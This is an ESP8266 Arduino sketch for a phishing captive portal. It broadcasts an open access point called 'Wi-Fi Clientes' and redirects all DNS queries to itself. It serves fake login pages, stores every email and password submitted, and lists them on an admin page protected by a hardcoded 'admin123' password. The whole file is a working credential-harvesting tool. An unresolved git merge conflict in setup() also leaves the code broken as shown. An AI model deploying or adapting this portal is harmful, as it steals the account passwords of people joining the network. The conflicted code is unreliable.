#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <vector>
#include "FS.h"

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

const char *adminUsername = "admin";
const char *adminPassword = "admin123";

struct Credentials {
  String username;
  String password;
};

std::vector<Credentials> credentialsHistory;

String getFileContent(const char* filePath) {
  String content = "";

  if (!SPIFFS.begin()){
    Serial.println("An Error has occurred while mounting SPIFFS");
    return content;
  }

  File file = SPIFFS.open(filePath, "r");
  if (!file){
    Serial.println("Failed to open file for reading");
    return content;
  }

  while (file.available()){
    content += (char)file.read();
  }

  file.close();
  return content;
}

void handleHomePage() {
  String home_page = getFileContent("/home.html");
  webServer.send(200, "text/html", home_page.c_str());
}


void handleLoginPage() { 
  String loginPage = getFileContent("/login-page.html"); 
  webServer.send(200, "text/html", loginPage.c_str()); 
}

void handlePostLogin() {
  String postLogin = getFileContent("/post-login.html");
  webServer.send(200, "text/html", postLogin.c_str());
}

void handleAdmin() {
  if (!webServer.authenticate(adminUsername, adminPassword)) {
    return webServer.requestAuthentication();
  }

  String adminPageHTML = "<!DOCTYPE html><html lang='en'><head>"
                          "<meta charset='UTF-8'>"
                          "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                          "<title>Admin Page</title>"
                          "<style>"
                          "@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');"
                          "body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #f0f2f5; }"
                          ".header { background-color: #1877f2; color: #fff; padding: 15px; text-align: center; }"
                          ".container { max-width: 800px; margin: 20px auto; }"
                          ".credentials-table { width: 100%; border-collapse: collapse; margin-top: 20px; }"
                          ".credentials-table th, .credentials-table td { border: 1px solid #ddd; padding: 12px; text-align: left; word-wrap: break-word; max-width: 150px; /* Ajuste conforme necessário */ }"
                          ".credentials-table th { background-color: #f2f2f2; }"
                          "</style>"
                          "</head><body>"
                          "<div class='header'><h1>Admin Page</h1></div>"
                          "<div class='container'>"
                          "<table class='credentials-table'>"
                          "<thead>"
                          "<tr>"
                          "<th>Username</th>"
                          "<th>Password</th>"
                          "</tr>"
                          "</thead>"
                          "<tbody>";
  
  for (const auto& credentials : credentialsHistory) {
    adminPageHTML += "<tr>"
                     "<td>" + credentials.username + "</td>"
                     "<td>" + credentials.password + "</td>"
                     "</tr>";
  }
  
  adminPageHTML += "</tbody>"
                   "</table>"
                   "</div></body></html>";


  webServer.send(200, "text/html", adminPageHTML);
}


void handleLoginSubmit() {
    if (webServer.hasArg("email") && webServer.hasArg("password")) {
        Credentials credentials;
        credentials.username = webServer.arg("email");
        credentials.password = webServer.arg("password");
        credentialsHistory.push_back(credentials);

        // Redirecionar para a página de post-login após o login bem-sucedido
        webServer.sendHeader("Location", "/post-login", true);
        webServer.send(302, "text/plain", "");
    } else {
        webServer.send(400, "text/plain", "Bad Request");
    }
}


void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
<<<<<<< HEAD:Arduino/captive-portal/captive-portal.ino
  WiFi.softAP("Wi-Fi Clientes");
=======
  WiFi.softAP("Wifi-Clientes","yourpassword");
>>>>>>> parent of 60d7538 (adding readme):Arduino/captive/captive.ino
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/admin", HTTP_GET, handleAdmin);
  
  webServer.on("/login", HTTP_GET, []() {
   handleLoginPage();
  });

  webServer.on("/post-login", HTTP_GET, []() {
   handlePostLogin();
  });

  webServer.on("/login-submit", HTTP_POST, []() {
    handleLoginSubmit();
  });

  webServer.onNotFound([]() {
    handleHomePage();  // Chame a função diretamente
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
